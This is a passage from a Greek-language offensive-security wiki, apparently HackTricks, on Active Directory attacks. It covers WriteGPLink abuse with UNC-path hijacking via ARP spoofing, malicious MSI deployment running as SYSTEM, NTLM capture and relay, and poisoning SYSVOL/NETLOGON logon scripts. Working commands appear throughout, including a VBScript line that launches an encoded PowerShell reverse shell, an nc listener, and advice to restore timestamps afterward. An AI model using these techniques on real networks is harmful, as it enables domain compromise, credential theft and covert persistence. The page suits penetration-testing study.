Το `WriteGPLink` σε OU/domain σάς επιτρέπει να τροποποιήσετε το attribute `gPLink` του target container και να **επιβάλετε την εφαρμογή ενός υπάρχοντος GPO** χωρίς να επεξεργαστείτε το ίδιο το GPO. Αυτό έχει ενδιαφέρον όταν το συνδεδεμένο GPO αναφέρεται ήδη σε απομακρυσμένο περιεχόμενο μέσω **UNC paths** (`\\HOST\share\...`), επειδή οι αυθεντικοποιημένοι χρήστες μπορούν να διαβάσουν το **SYSVOL** και να αναζητήσουν εκτός σύνδεσης επαναχρησιμοποιήσιμες πολιτικές.<sup>[[11]](#references)</sup>

Ροή εργασίας υψηλού επιπέδου:

1. Χρησιμοποιήστε το BloodHound για να εντοπίσετε principal με `WriteGPLink` σε OU και να απαριθμήσετε υπολογιστές/χρήστες μέσα σε αυτό το OU.
2. Αντιγράψτε το `SYSVOL` μόνο για ανάγνωση και αναλύστε τα GPO αναζητώντας **Software Installation**, **drive mappings** (`Drives.xml`) και **logon/startup scripts** που αναφέρονται σε UNC paths.
3. Προτιμήστε πολιτικές που δείχνουν σε **άμεσο hostname** (για παράδειγμα `\\DC02\share\pkg.msi`) αντί για DFS/domain-namespace paths, επειδή τα paths με hostname είναι ευκολότερο να ανακατευθυνθούν με L2 spoofing.
4. Προσθέστε το GUID του επιλεγμένου GPO στο `gPLink` του target OU, ώστε το θύμα να επεξεργαστεί αυτήν την ήδη υπάρχουσα πολιτική.
5. Στο ίδιο broadcast domain, εκτελέστε ARP spoofing στο UNC host και αντιστοιχίστε το IP του τοπικά (`ip addr add <target_ip>/32 dev <iface>`), ώστε η SMB κίνηση του θύματος να φτάσει στον host σας.
6. Παρέχετε το αναμενόμενο path/filename από έναν SMB server του επιτιθέμενου (για παράδειγμα `smbserver.py`) και περιμένετε την κανονική επεξεργασία πολιτικής.

Παράδειγμα συλλογής `SYSVOL` και συσχέτισης GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Συνδέστε το υπάρχον GPO με το OU-στόχο:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Αν το συνδεδεμένο GPO αναπτύσσει ένα MSI από διαδρομή UNC, ο client θα το ανακτήσει κατά την **εκκίνηση του υπολογιστή** και θα το εγκαταστήσει ως **`NT AUTHORITY\SYSTEM`**. Με πλαστογράφηση του host που αναφέρεται και διάθεση ενός κακόβουλου MSI στο **ίδιο share/path/name**, μπορείτε να μετατρέψετε το `WriteGPLink` σε εκτέλεση κώδικα ως SYSTEM **χωρίς να τροποποιήσετε το SYSVOL**.

Σημαντικοί περιορισμοί:

- **Ο χρονισμός έχει σημασία**: ο νέος σύνδεσμος γίνεται αντιληπτός κατά την ανανέωση πολιτικής (συνήθως κάθε ~90 λεπτά), αλλά το **Software Installation** συνήθως ενεργοποιείται κατά την **επανεκκίνηση**.
- Το Windows Installer συνήθως παρακολουθεί την ανάπτυξη χρησιμοποιώντας το **`ProductCode`** του πακέτου. Αν το προϊόν είναι ήδη εγκατεστημένο, η ανάπτυξη μπορεί να παραλειφθεί.
- Για να αποφύγετε την απόρριψη από το πρόγραμμα εγκατάστασης, τροποποιήστε το κακόβουλο MSI ώστε τα **`ProductCode`** και **`PackageCode`** να ταιριάζουν με εκείνα του νόμιμου πακέτου που αναμένει το GPO.
- Παλιά αρχεία διαφήμισης `.aas` μπορεί να παραμένουν στο `SYSVOL`, γι’ αυτό επαληθεύστε ότι η ανάπτυξη εξακολουθεί να φαίνεται ενεργή πριν βασιστείτε σε αυτήν.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Οι αντιστοιχίσεις μονάδων δίσκου GPP στο `Drives.xml` κάνουν τους χρήστες να πραγματοποιούν authentication στη διαμορφωμένη διαδρομή UNC κατά τη σύνδεση ή την επανασύνδεση. Αν κάνεις spoof τον αναφερόμενο host, μπορείς να καταγράψεις **NetNTLMv2**. Αν προκαλέσεις σκόπιμα αποτυχία του SMB, τα Windows ενδέχεται να επαναλάβουν την προσπάθεια μέσω **WebDAV**, στέλνοντας **NTLM over HTTP**, το οποίο προσφέρει πολύ μεγαλύτερη ευελιξία για relays προς **LDAP(S)**, **AD CS** ή **SMB**.

#### Logon/startup script UNC hijack

Το ίδιο μοτίβο ισχύει για scripts που φιλοξενούνται σε UNC και εντοπίζονται στο `SYSVOL`:

- Τα **logon scripts** εκτελούνται συνήθως στο context του **user**.
- Τα **startup scripts** εκτελούνται συνήθως στο context του **computer / SYSTEM**.

Αν η διαδρομή του script δείχνει σε hostname που μπορείς να κάνεις spoof, ανακατεύθυνε τον UNC host και εξυπηρέτησε περιεχόμενο script αντικατάστασης από την αναμενόμενη τοποθεσία.

## Poisoning Logon Script σε SYSVOL/NETLOGON

Οι διαδρομές με δυνατότητα εγγραφής κάτω από `\\<dc>\SYSVOL\<domain>\scripts\` ή `\\<dc>\NETLOGON\` επιτρέπουν την αλλοίωση logon scripts που εκτελούνται κατά τη σύνδεση των χρηστών μέσω GPO. Αυτό παρέχει εκτέλεση κώδικα στο security context των χρηστών που συνδέονται.

### Εντοπισμός logon scripts
- Εξέτασε τα attributes των χρηστών για ρυθμισμένο logon script:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Κάντε crawl στα domain shares για να εντοπίσετε συντομεύσεις ή αναφορές σε scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Αναλύστε αρχεία `.lnk` για να εντοπίσετε τους στόχους που δείχνουν στο SYSVOL/NETLOGON (χρήσιμο τέχνασμα DFIR και για επιτιθέμενους χωρίς άμεση πρόσβαση σε GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- Το BloodHound εμφανίζει το attribute `scriptPath` του αντικειμένου χρήστη για το logon script, όταν υπάρχει. Τα logon scripts που έχουν διαμορφωθεί μέσω GPO αποτελούν ξεχωριστή αναφορά πολιτικής, επομένως ελέγξτε και το εφαρμοστέο GPO.

### Επαληθεύστε την πρόσβαση εγγραφής (μην εμπιστεύεστε τις καταχωρίσεις των shares)
Τα automated εργαλεία μπορεί να εμφανίζουν τα SYSVOL/NETLOGON ως read-only, ακόμη κι όταν το συγκεκριμένο script έχει διαφορετικό NTFS ACL. Ξεκινήστε με read-only επιθεώρηση του αρχείου και του γονικού καταλόγου του· τα αντίστοιχα Allow ACE παραμένουν υποψήφια, επειδή συνυπολογίζονται η αποτελεσματική πρόσβαση SMB και NTFS, τα Deny ACE και το τρέχον token:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Μολύνετε ένα VBScript logon script για RCE
Προσθέστε μια εντολή που εκκινεί ένα PowerShell reverse shell (δημιουργήστε το στο revshells.com) και διατηρήστε την αρχική λογική, ώστε να μη διαταραχθεί η επιχειρησιακή λειτουργία:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Ακούστε στον host σας και περιμένετε την επόμενη διαδραστική σύνδεση:

```bash
rlwrap -cAr nc -lnvp 443
```

Σημειώσεις:
- Η εκτέλεση γίνεται με το token του χρήστη καταγραφής (όχι με SYSTEM). Το εύρος είναι ο σύνδεσμος GPO (OU, site, domain) στον οποίο εφαρμόζεται αυτό το script.
- Μετά τη χρήση, επαναφέρετε το αρχικό περιεχόμενο και τις χρονικές σημάνσεις.


## References

- [1] [Κατάχρηση ACLs/ACEs του Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Προνομιακοί λογαριασμοί και προνόμια token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Η ενημέρωση για τα ACL Attack Paths](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Κλιμάκωση προνομίων με ACLs στο Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Σάρωση για προνόμια και προνομιούχους λογαριασμούς στο Active Directory](https://adsecurity.org/?p=3658)
- [7] [Κατασκευαστής ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Λειτουργίες χαρακτηριστικών AD/UAC από Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (συμμετοχή σε ομάδα)](https://www.samba.org/)
- [10] [HTB Puppy: κατάχρηση AD ACL, cracking Argon2 του KeePassXC και αποκρυπτογράφηση DPAPI για πρόσβαση διαχειριστή DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - Γύρω από το ARP και ανακαλύψτε τι θα βρείτε: Παραβίαση διαδρομών UNC του GPO για εκτέλεση κώδικα και NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: εκμετάλλευση GPO του Active Directory μέσω NTLM relaying και άλλα](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [Η OU αστειεύεται; - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: εκμετάλλευση κρυφών διανυσμάτων επίθεσης ACL σε Organizational Units του Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Προσομοίωση νόμιμων υπηρεσιών Active Directory στο δίκτυο: η περίπτωση της εκμετάλλευσης GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
